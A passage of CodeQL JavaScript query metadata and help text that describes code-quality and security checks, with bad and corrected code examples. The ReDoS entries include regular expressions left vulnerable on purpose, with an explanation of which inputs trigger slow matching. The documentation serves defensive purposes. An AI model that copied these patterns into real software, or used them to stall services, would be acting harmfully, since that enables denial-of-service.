    In the following example, the call to `log.error` will log the string "`${id}`", rather than the contents of the `id` variable.


    ```javascript
    log.info(`Connecting to ${id}`)
    let connection = openConnection(id)
    if (!connection) {
      log.error('Could not connect to ${id}')
    }

    ```
    To correct the error message, change the quotes to backticks:


    ```javascript
    log.info(`Connecting to ${id}`)
    let connection = openConnection(id)
    if (!connection) {
      log.error(`Could not connect to ${id}`)
    }

    ```

    ## References
    * Mozilla Developer Network: [Template literals](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Template_literals).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/ThisBeforeSuper.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/ThisBeforeSuper.bqrs
  metadata:
    name: Use of incompletely initialized object
    description: |-
      Accessing 'this' or a property of 'super' in the constructor of a
                    subclass before calling the super constructor will cause a runtime error.
    kind: problem
    problem.severity: error
    id: js/incomplete-object-initialization
    tags: |-
      quality
             reliability
             correctness
             language-features
    precision: high
  queryHelp: |
    # Use of incompletely initialized object
    If a class extends another class, its constructor needs to call the super constructor before referencing `this` or accessing properties through `super`. Failure to do so will cause a runtime error.


    ## Recommendation
    Insert a super constructor call.


    ## Example
    In the following example, class `A` extends class `B`, but its constructor assigns to `this.x` without first invoking the super constructor, which will cause a runtime error.

    ```javascript

    class A extends B {
      constructor() { this.x = 42; }
    }

    ```
    To prevent the error, a super constructor call should be inserted:

    ```javascript

    class A extends B {
      constructor() { super(); this.x = 42; }
    }

    ```

    ## References
    * Mozilla Developer Network: [Sub classing with extends](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes#Sub_classing_with_extends).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/UnusedIndexVariable.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/UnusedIndexVariable.bqrs
  metadata:
    name: Unused index variable
    description: |-
      Iterating over an array but not using the index variable to access array elements
                    may indicate a typo or logic error.
    kind: problem
    problem.severity: warning
    id: js/unused-index-variable
    precision: high
    tags: |-
      quality
             reliability
             correctness
  queryHelp: |
    # Unused index variable
    If the loop variable of a `for` loop ranges over the indices of an array, that variable would normally be used as an array index in the body of the loop. If, instead, the loop body only refers to array elements at constant indices, this may indicate a logic error or leftover testing code.


    ## Recommendation
    Examine the loop carefully to ensure it is behaving as expected. You may want to consider using a `for`-`of` loop to iterate over all elements of an array without the need for error-prone index manipulations.


    ## Example
    The following example shows a function that is intended to sum up the elements of an array `xs`. The loop variable `i` is counted up from zero to `xs.length-1`, but instead of adding `xs[i]` to the running sum `res`, the code adds `xs[0]`, the first element of `xs`, to it, which is likely a mistake:


    ```javascript
    function sum(xs) {
      var res = 0;
      for(var i=0; i<xs.length; ++i)
        res += xs[0]; // BAD: should be xs[i]
      return res;
    }

    ```
    The problem can be fixed by adding `xs[i]` instead:


    ```javascript
    function sum(xs) {
      var res = 0;
      for(var i=0; i<xs.length; ++i)
        res += xs[i];
      return res;
    }

    ```
    Alternatively, the function can be written more succinctly using a `for`-`of` loop:


    ```javascript
    function sum(xs) {
      var res = 0;
      for(var x of xs)
        res += x;
      return res;
    }

    ```

    ## References
    * Mozilla Developer Network: [for](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for)
    * Mozilla Developer Network: [for...of](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of)
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/WithStatement.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/WithStatement.bqrs
  metadata:
    name: With statement
    description: The 'with' statement has subtle semantics and should not be used.
    kind: problem
    problem.severity: warning
    id: js/with-statement
    tags: |-
      quality
             maintainability
             complexity
             language-features
    precision: very-high
  queryHelp: "# With statement\nThe `with` statement provides a shorthand when accessing\
    \ many properties of the same object. If a property is not found on that object,\
    \ enclosing scopes are searched for a variable of the same name. This is confusing\
    \ and makes code brittle and hard to read. For this reason, `with` is best avoided.\n\
    \n\n## Recommendation\nEliminate `with` statements by introducing explicit property\
    \ accesses.\n\n\n## Example\nThe following code snippet reads properties `firstName`,\
    \ `lastName` and `email` from the object stored in `record` by means of a `with`\
    \ statement. It also invokes the `addRecord` function, which is presumably defined\
    \ in an enclosing scope.\n\n\n```javascript\nfunction process(record) {\n\twith\
    \ (record) {\n\t\taddRecord(firstName + \" \" + lastName, email);\n\t}\n}\n```\n\
    Note that if `record` does not have any of the properties `firstName`, `lastName`\
    \ or `email`, they will be looked up as variables in enclosing scopes. Conversely,\
    \ if it should happen to have a property `addRecord`, the function call will attempt\
    \ to invoke the value of this property as a method.\n\nTo clarify the intended\
    \ meaning of the code, the `with` statement should be removed and property accesses\
    \ should be introduced to make it explicit which names are intended to be read\
    \ from `record`, and which ones are intended to be looked up in enclosing scopes:\n\
    \n\n```javascript\nfunction process(record) {\n\taddRecord(record.firstName +\
    \ \" \" + record.lastName, record.email);\n}\n```\nNote that `with` statements\
    \ are not allowed in strict mode code.\n\n\n## References\n* D. Crockford, *JavaScript:\
    \ The Good Parts*, Appendix B.2. O'Reilly, 2008.\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/YieldInNonGenerator.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/YieldInNonGenerator.bqrs
  metadata:
    name: Yield in non-generator function
    description: '''yield'' should only be used in generator functions.'
    kind: problem
    problem.severity: error
    id: js/yield-outside-generator
    tags: |-
      quality
             reliability
             correctness
             language-features
             external/cwe/cwe-758
    precision: very-high
  queryHelp: |
    # Yield in non-generator function
    Previous versions of SpiderMonkey permitted the use of `yield` expressions in functions not marked as generators. This is no longer supported, and is not compliant with ECMAScript 2015.


    ## Recommendation
    Mark the enclosing function as a generator by replacing `function` with `function*`.


    ## Example
    The following example uses `yield` to produce a sequence of indices, but the function `idMaker` is not marked as a generator:


    ```javascript
    function idMaker(){
        var index = 0;
        while(true)
            yield index++;
    }

    ```
    This is easily fixed by adding an asterisk to the `function` keyword:


    ```javascript
    function* idMaker(){
        var index = 0;
        while(true)
            yield index++;
    }

    ```

    ## References
    * Mozilla Developer Network: [function\*](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function*).
    * Mozilla Developer Network: [yield](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/yield).
    * Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: NodeJS/InvalidExport.ql
  relativeBqrsPath: codeql/javascript-queries/NodeJS/InvalidExport.bqrs
  metadata:
    name: Assignment to exports variable
    description: |-
      Assigning to the special 'exports' variable only overwrites its value and does not export
                    anything. Such an assignment is hence most likely unintentional.
    kind: problem
    problem.severity: warning
    id: js/node/assignment-to-exports-variable
    tags: |-
      quality
             reliability
             correctness
             frameworks/node.js
             external/cwe/cwe-563
    precision: very-high
  queryHelp: "# Assignment to exports variable\nNode.js modules that only export a\
    \ single value commonly do so by assigning it directly to the `module.exports`\
    \ property. A common mistake is to assign it to the `exports` variable instead,\
    \ but this simply overwrites the value of `exports` without affecting the value\
    \ of `module.exports`, and does not lead to anything being exported.\n\n\n## Recommendation\n\
    Rewrite the assignment to assign to `module.exports` instead.\n\n\n## Example\n\
    In the following example, module `point.js` attempts to export the function `Point`\
    \ by assigning it to `exports`. As explained above, this does not work as expected:\
    \ after the assignment, the `exports` *variable* will contain a reference to `Point`,\
    \ but the `module.exports` *property* still contains a reference to an empty object.\
    \ Consequently, the client code in `client.js` will fail, since it attempts to\
    \ call an object as a constructor.\n\n\n```javascript\n// point.js\nfunction Point(x,\
    \ y) {\n\tthis.x = x;\n\tthis.y = y;\n}\n\nPoint.prototype.distance = function()\
    \ {\n\treturn Math.sqrt(this.x*this.x+this.y*this.y);\n};\n\nexports = Point;\n\
    \n// client.js\nvar Point = require('./point');\n\nvar pyth = new Point(3, 4);\n\
    console.log(pyth.distance());\n```\nInstead of assigning to `exports`, `point.js`\
    \ should assign to `module.exports`:\n\n\n```javascript\n// point.js\nfunction\
    \ Point(x, y) {\n\tthis.x = x;\n\tthis.y = y;\n}\n\nPoint.prototype.distance =\
    \ function() {\n\treturn Math.sqrt(this.x*this.x+this.y*this.y);\n};\n\nmodule.exports\
    \ = Point;\n\n// client.js\nvar Point = require('./point');\n\nvar pyth = new\
    \ Point(3, 4);\nconsole.log(pyth.distance());\n```\n\n## References\n* Node.js\
    \ Manual: [exports alias](http://nodejs.org/api/modules.html#modules_exports_alias).\n\
    * Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: NodeJS/MissingExports.ql
  relativeBqrsPath: codeql/javascript-queries/NodeJS/MissingExports.bqrs
  metadata:
    name: Missing exports qualifier
    description: |-
      Referencing an undeclared global variable in a module that exports
                    a definition of the same name is confusing and may indicate a bug.
    kind: problem
    problem.severity: error
    id: js/node/missing-exports-qualifier
    tags: |-
      quality
             reliability
             correctness
             frameworks/node.js
    precision: high
  queryHelp: |
    # Missing exports qualifier
    Referencing an otherwise undeclared global variable in a module that exports a definition of the same name is confusing and may indicate a bug.


    ## Recommendation
    If the global variable reference is intentional, consider adding a JSLint `/*global ...*/` directive or an externs declaration to declare the variable.

    If the global variable reference is unintentional, qualifying the reference with `exports` will make it refer to the exported definition instead.


    ## Example
    In the following example, the module exports two functions `checkOne` and `checkList`. The latter is also stored in a variable of the same name that is local to the module, but the former is not. Hence the call `checkOne(xs[i])` on line 7 does not refer to the function defined on line 1, but to an otherwise undeclared global variable also called `checkOne`.


    ```javascript
    exports.checkOne = function(x) {
      if (!x) throw new Error();
    };

    var checkList = exports.checkList = function(xs) {
      for (var i=0; i<xs.length; ++i)
        checkOne(xs[i]);
    };
    ```
    Assuming that the intention is to call the `checkOne` function defined on line 1, the call should be qualified with `exports` like this:


    ```javascript
    exports.checkOne = function(x) {
      if (!x) throw new Error();
    };

    var checkList = exports.checkList = function(xs) {
      for (var i=0; i<xs.length; ++i)
        exports.checkOne(xs[i]);
    };
    ```

    ## References
    * Node.js: [Modules](https://nodejs.org/api/modules.html).
    * JSLint Help: [JSLint Directives](http://www.jslint.com/help.html).
    * Closure Compiler: [Advanced Compilation and Externs](https://developers.google.com/closure/compiler/docs/api-tutorial3).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Performance/PolynomialReDoS.ql
  relativeBqrsPath: codeql/javascript-queries/Performance/PolynomialReDoS.bqrs
  metadata:
    name: Polynomial regular expression used on uncontrolled data
    description: |-
      A regular expression that can require polynomial time
                    to match may be vulnerable to denial-of-service attacks.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/polynomial-redos
    tags: |-
      security
             external/cwe/cwe-1333
             external/cwe/cwe-730
             external/cwe/cwe-400
  queryHelp: |
    # Polynomial regular expression used on uncontrolled data
    Some regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service ("DoS") attack by crafting an expensive input string for the regular expression to match.

    The regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.

    Typically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.


    ## Recommendation
    Modify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.


    ## Example
    Consider this use of a regular expression, which removes all leading and trailing whitespace in a string:

    ```javascript

    text.replace(/^\s+|\s+$/g, ''); // BAD
    ```
    The sub-expression `"\s+$"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.

    This ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `"a b"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.

    Avoid this problem by rewriting the regular expression to not contain the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`/^\s+|(?<!\s)\s+$/g`), or just by using the built-in trim method (`text.trim()`).

    Note that the sub-expression `"^\s+"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.


    ## Example
    As a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:

    ```javascript

    /^0\.\d+E?\d+$/.test(str) // BAD
    ```
    The problem with this regular expression is in the sub-expression `\d+E?\d+` because the second `\d+` can start matching digits anywhere after the first match of the first `\d+` if there is no `E` in the input string.

    This is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.

    To make the processing faster, the regular expression should be rewritten such that the two `\d+` sub-expressions do not have overlapping matches: `^0\.\d+(E\d+)?$`.


    ## Example
    Sometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:

    ```javascript

    /^(\+|-)?(\d+|(\d*\.\d*))?(E|e)?([-+])?(\d+)?$/.test(str) // BAD
    ```
    It is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.

    ```javascript

    if (str.length > 1000) {
        throw new Error("Input too long");
    }

    /^(\+|-)?(\d+|(\d*\.\d*))?(E|e)?([-+])?(\d+)?$/.test(str)
    ```

    ## References
    * OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).
    * Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).
    * Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).
    * James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).
    * Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).
    * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Performance/ReDoS.ql
  relativeBqrsPath: codeql/javascript-queries/Performance/ReDoS.bqrs
  metadata:
    name: Inefficient regular expression
    description: |-
      A regular expression that requires exponential time to match certain inputs
                    can be a performance bottleneck, and may be vulnerable to denial-of-service
                    attacks.
    kind: problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/redos
    tags: |-
      security
             external/cwe/cwe-1333
             external/cwe/cwe-730
             external/cwe/cwe-400
  queryHelp: |
    # Inefficient regular expression
    Some regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service ("DoS") attack by crafting an expensive input string for the regular expression to match.

    The regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.

    Typically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.


    ## Recommendation
    Modify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.


    ## Example
    Consider this regular expression:

    ```javascript

    /^_(__|.)+_$/
    ```
    Its sub-expression `"(__|.)+?"` can match the string `"__"` either by the first alternative `"__"` to the left of the `"|"` operator, or by two repetitions of the second alternative `"."` to the right. Thus, a string consisting of an odd number of underscores followed by some other character will cause the regular expression engine to run for an exponential amount of time before rejecting the input.

    This problem can be avoided by rewriting the regular expression to remove the ambiguity between the two branches of the alternative inside the repetition:

    ```javascript

    /^_(__|[^_])+_$/
    ```

    ## References
    * OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).
    * Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).
    * Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).
    * James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).
    * Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).
    * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: React/DirectStateMutation.ql
  relativeBqrsPath: codeql/javascript-queries/React/DirectStateMutation.bqrs
  metadata:
    name: Direct state mutation
    description: |-
      Mutating the state of a React component directly may lead to
                    lost updates.
    kind: problem
    problem.severity: warning
    id: js/react/direct-state-mutation
    tags: |-
      quality
             reliability
             correctness
             frameworks/react
    precision: very-high
  queryHelp: |
    # Direct state mutation
    React components have a `state` property. This property contains data associated with the component that may change over time. Although properties of the state object can be read freely, they should not be updated directly, since such modifications could be overwritten by asynchronous updates performed by `setState`.


    ## Recommendation
    Rewrite the code to use `setState` instead.


    ## Example
    The following example component uses `setInterval` to register method `tick` as a callback that is invoked every second and updates `state.now` directly:

    ```javascript

    class Clock extends React.Component {
      componentDidMount() {
        setInterval(() => this.tick(), 1000);
      }
      tick() {
        this.state.now = Date.now();
      }
    }

    ```
    Instead, `setState` should be used:

    ```javascript

    class Clock extends React.Component {
      componentDidMount() {
        setInterval(() => this.tick(), 1000);
      }
      tick() {
        this.setState({ now: Date.now() });
      }
    }

    ```

    ## References
    * React Quick Start: [State and Lifecycle](https://facebook.github.io/react/docs/state-and-lifecycle.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: React/InconsistentStateUpdate.ql
  relativeBqrsPath: codeql/javascript-queries/React/InconsistentStateUpdate.bqrs
  metadata:
    name: Potentially inconsistent state update
    description: |-
      Updating the state of a component based on the current value of
                    'this.state' or 'this.props' may lead to inconsistent component
                    state.
    kind: problem
    problem.severity: warning
    id: js/react/inconsistent-state-update
    tags: |-
      quality
             reliability
             correctness
             frameworks/react
    precision: very-high
  queryHelp: |
    # Potentially inconsistent state update
    React component state updates using `setState` may asynchronously update `this.props` and `this.state`, thus it is not safe to use either of the two when calculating the new state passed to `setState`.


    ## Recommendation
    Use the callback-based variant of `setState`: instead of calculating the new state directly and passing it to `setState`, pass a callback function that calculates the new state when the update is about to be performed.


    ## Example
    The following example uses `setState` to update the `counter` property of `this.state`, relying on the current (potentially stale) value of that property:

    ```javascript

    this.setState({
      counter: this.state.counter + 1
    });

    ```
    Instead, the callback form of `setState` should be used:

    ```javascript

    this.setState(prevState => ({
      counter: prevState.counter + 1
    }));

    ```

    ## References
    * React Quick Start: [State and Lifecycle](https://facebook.github.io/react/docs/state-and-lifecycle.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: React/UnsupportedStateUpdateInLifecycleMethod.ql
  relativeBqrsPath: codeql/javascript-queries/React/UnsupportedStateUpdateInLifecycleMethod.bqrs
  metadata:
    name: Unsupported state update in lifecycle method
    description: Attempting to update the state of a React component at the wrong
      time can cause undesired behavior.
    kind: problem
    problem.severity: warning
    id: js/react/unsupported-state-update-in-lifecycle-method
    tags: |-
      quality
             reliability
             correctness
             frameworks/react
    precision: high
  queryHelp: |
    # Unsupported state update in lifecycle method
    The three builtin React component methods `setState`, `replaceState`, and `forceUpdate` can update the state of a component asynchronously. It is, however, not recommended to invoke these methods at certain points in the lifecycle of the component.

    For instance, invoking one of the state update methods during a call to `render` will cause React to throw an exception because the `render` method must be pure. Invoking one of the state update methods from the constructor of a component is also forbidden because the component is not mounted at that point in time. The three component methods `componentDidUpdate`, `componentWillUpdate`, and `shouldComponentUpdate` do allow calls to the state update methods, but only if the calls are conditional.


    ## Recommendation
    Only invoke a state update method on a React component when its lifecycle allows it.


    ## Example
    The following example uses `setState` to update the `counter` property of `this.state`, from the constructor of a React component:


    ```javascript
    class MyComponent extends React.Component {

        constructor(props) {
            super(props)
            this.setState({
                counter: 0
            })

        }

        render() {
            return <div>{this.state.counter}</div>
        }

    }

    ```
    Instead, replace the call to `setState` with an assignment:


    ```javascript
    class MyComponent extends React.Component {

        constructor(props) {
            super(props)
            this.state.counter = 0;
        }

        render() {
            return <div>{this.state.counter}</div>
        }

    }

    ```

    ## References
    * React reference: [React.Component](https://reactjs.org/docs/react-component.html).
    * React Quick Start: [State and Lifecycle](https://reactjs.org/docs/state-and-lifecycle.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: React/UnusedOrUndefinedStateProperty.ql
  relativeBqrsPath: codeql/javascript-queries/React/UnusedOrUndefinedStateProperty.bqrs
  metadata:
    name: Unused or undefined state property
    description: Unused or undefined component state properties may be a symptom of
      a bug and should be examined carefully.
    kind: problem
    problem.severity: warning
    id: js/react/unused-or-undefined-state-property
    tags: |-
      quality
             reliability
             correctness
             frameworks/react
    precision: high
  queryHelp: |
    # Unused or undefined state property
    Unused or undefined React component state properties can cause errors or make code hard to read and understand. Any computation used to initialize an unused state property is wasted, which may lead to performance problems. Any access to an undefined component state property trivially evaluates to the value `undefined`, which may come as a surprise.


    ## Recommendation
    Remove unused component state properties. Assign values to undefined component state properties.


    ## Example
    In the code below, the React component `Clock` attempts to display the current time in the `render` method.


    ```javascript
    class Clock extends React.Component {
        constructor(props) {
            super(props);
            this.state = { };
        }

        render() {
             // BAD: this.state.date is undefined
            var now = this.state.date.toLocaleTimeString();
            return (
                    <div>
                    <h2>The time is {now}.</h2>
                    </div>
            );
        }
    }

    ```
    But since there are no assignments to `this.state.date`, the `render` method will throw an exception when attempting to access the property `toLocaleString` of the value `undefined`. To avoid this exception, assign the `date` property before using it:


    ```javascript
    class Clock extends React.Component {
        constructor(props) {
            super(props);
            this.state = { date: new Date() };
        }

        render() {
             // GOOD: this.state.date is defined above
            var now = this.state.date.toLocaleTimeString()
            return (
                    <div>
                    <h2>The time is {now}.</h2>
                    </div>
            );
        }
    }

    ```

    ## References
    * React: [Component State](https://reactjs.org/docs/faq-state.html).
    * React: [State and Lifecycle](https://reactjs.org/docs/state-and-lifecycle.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: RegExp/BackrefBeforeGroup.ql
  relativeBqrsPath: codeql/javascript-queries/RegExp/BackrefBeforeGroup.bqrs
  metadata:
    name: Back reference precedes capture group
    description: |-
      If a back reference precedes the capture group it refers to, it matches the empty string,
                    which is probably not what was expected.
    kind: problem
    problem.severity: error
    id: js/regex/back-reference-before-group
    tags: |-
      quality
             reliability
             correctness
             regular-expressions
    precision: very-high
  queryHelp: "# Back reference precedes capture group\nBack references can be used\
    \ to refer back to the result of a previously matched capture group. It is syntactically\
    \ legal to refer to a capture group that has not finished matching yet, but such\
    \ a back reference always matches the empty string and is not very useful.\n\n\
    \n## Recommendation\nRemove the back reference if it is useless, or update it\
    \ to refer to the right capture group.\n\n\n## Example\nIn the following example,\
    \ the back reference `\\2` comes before the capture group `(.*)` it refers to.\
    \ (Note that the first group is non-capturing.)\n\n\n```javascript\nif (/(?:start|end)(\\\
    [*|\\{*)abc\\2:(.*)/.test(input))\n\tconsole.log(\"Found the pattern.\");\n```\n\
    Forward references like this can arise if a regular expression is updated inconsistently.\
    \ In this example, for instance, the first group may initially have been capturing\
    \ so the back reference referred to the group `(\\[*|\\{*])`. This group, however,\
    \ is now the first capturing group, so the back reference should be updated to\
    \ `\\1`.\n\n\n## References\n* Mozilla Developer Network: [JavaScript Regular\
    \ Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: RegExp/BackrefIntoNegativeLookahead.ql
  relativeBqrsPath: codeql/javascript-queries/RegExp/BackrefIntoNegativeLookahead.bqrs
  metadata:
    name: Back reference into negative lookahead assertion
    description: |-
      If a back reference refers to a capture group inside a preceding negative lookahead assertion,
                    then the back reference always matches the empty string, which probably indicates a mistake.
    kind: problem
    problem.severity: error
    id: js/regex/back-reference-to-negative-lookahead
    tags: |-
      quality
             reliability
             correctness
             regular-expressions
    precision: very-high
  queryHelp: |
    # Back reference into negative lookahead assertion
    Back references can be used to refer to the result of a previously matched capture group. It is syntactically legal to refer from outside a negative lookahead assertion to a capture group nested inside that assertion, but since the regular expression can only match when the body of the negative lookahead assertion did *not* match, such a back reference always matches the empty string. This probably indicates a mistake.


    ## Recommendation
    Remove the back reference if it is useless, or fix the regular expression to make sure the reference refers to the intended capture group.


    ## Example
    In the following example, the back reference `\2` refers to the capture group `(a+)` inside the negative lookahead assertion `(?!(a+)b)`.


    ```javascript
    /(.*?)a(?:d*)a(?!(a+)b)\2(.*)/;
    ```
    Useless back references like this can arise if a regular expression is updated inconsistently. In this example, for instance, the group `(?:d*)` may initially have been capturing, so the back reference `\2` would have referred to it instead of the capture group inside the negative lookahead assertion. If this is the case, the group `(?:d*)` should be made capturing again, that is, it should be replaced by `(d*)`.

    Note that referring to a capture group from within the same negative lookahead assertion is unproblematic.


    ## References
    * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 15.10.2.8. ECMA, 2011.
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: RegExp/DuplicateCharacterInCharacterClass.ql
  relativeBqrsPath: codeql/javascript-queries/RegExp/DuplicateCharacterInCharacterClass.bqrs
  metadata:
    name: Duplicate character in character class
    description: |-
      If a character class in a regular expression contains the same character twice, this may
                    indicate a bug.
    kind: problem
    problem.severity: warning
    id: js/regex/duplicate-in-character-class
    tags: |-
      quality
             reliability
             correctness
             regular-expressions
    precision: very-high
  queryHelp: "# Duplicate character in character class\nCharacter classes in regular\
    \ expressions (denoted by square brackets `[]`) represent sets of characters where\
    \ the pattern matches any single character from that set. Since character classes\
    \ are sets, specifying the same character multiple times is redundant and often\
    \ indicates a programming error.\n\nCommon mistakes include:\n\n* Using square\
    \ brackets `[]` instead of parentheses `()` for grouping alternatives\n* Misunderstanding\
    \ that special regex characters like `|`, `*`, `+`, `()`, and `-` work differently\
    \ when appearing inside a character class\n* Accidentally duplicating characters\
    \ or escape sequences that represent the same character\n\n## Recommendation\n\
    Examine each duplicate character to determine the intended behavior:\n\n* If you\
    \ see `|` inside square brackets (e.g., `[a|b|c]`): This is usually a mistake.\
    \ The author likely intended alternation. Replace the character class with a group:\
    \ `(a|b|c)`\n* If trying to match alternative strings, use parentheses `()` for\
    \ grouping instead of square brackets\n* If the duplicate was truly accidental,\
    \ remove the redundant characters\n* If trying to use special regex operators\
    \ inside square brackets, note that most operators (like `|`) are treated as literal\
    \ characters\nNote that simply removing `|` characters from character classes\
    \ is rarely the correct fix. Instead, analyze the pattern to understand what the\
    \ author intended to match.\n\n\n## Example\n**Example 1: Confusing character\
    \ classes with groups**\n\nThe pattern `[password|pwd]` does not match \"password\"\
    \ or \"pwd\" as intended. Instead, it matches any single character from the set\
    \ `{p, a, s, w, o, r, d, |}`. Note that `|` has no special meaning inside character\
    \ classes.\n\n\n```javascript\nif (/[password|pwd] =/.test(input))\n\tconsole.log(\"\
    Found password!\");\n```\nTo fix this problem, the regular expression should be\
    \ rewritten to `/(password|pwd) =/`.\n\n**Example 2: CSS unit matching**\n\nThe\
    \ pattern `r?e[m|x]` appears to be trying to match \"rem\" or \"rex\", but actually\
    \ matches \"re\" followed by any of the characters `{m, |, x}`. The correct pattern\
    \ should be `r?e(m|x)` or `r?e[mx]`.\n\nSimilarly, `v[h|w|min|max]` should be\
    \ `v(h|w|min|max)` to properly match \"vh\", \"vw\", \"vmin\", or \"vmax\".\n\n\
    \n## References\n* Mozilla Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n\
    * MDN: [Character Classes](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Character_Classes)\
    \ - Details on how character classes work.\n* MDN: [Groups and Ranges](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Groups_and_Ranges)\
    \ - Proper use of grouping with parentheses.\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: RegExp/EmptyCharacterClass.ql
  relativeBqrsPath: codeql/javascript-queries/RegExp/EmptyCharacterClass.bqrs
  metadata:
    name: Empty character class
    description: Empty character classes are not normally useful and may indicate
      a bug.
    kind: problem
    problem.severity: warning
    id: js/regex/empty-character-class
    tags: |-
      quality
             reliability
             correctness
             regular-expressions
    precision: very-high
  queryHelp: "# Empty character class\nAn empty character class in a regular expression\
    \ does not match anything and may indicate missing code.\n\n\n## Recommendation\n\
    Omit the empty character class. If the whole regular expression would become empty,\
    \ use `/(?:)/` to express a deliberately empty regular expression.\n\n\n## Example\n\
    In the following example, the programmer presumably meant to write a regular expression\
    \ that matches an opening square bracket or curly brace, followed by one or more\
    \ letters or digits, followed by a closing square bracket or curly brace. However,\
    \ they forgot to escape the closing square bracket with a backslash, leading to\
    \ an empty character class. The resulting regular expression is malformed and\
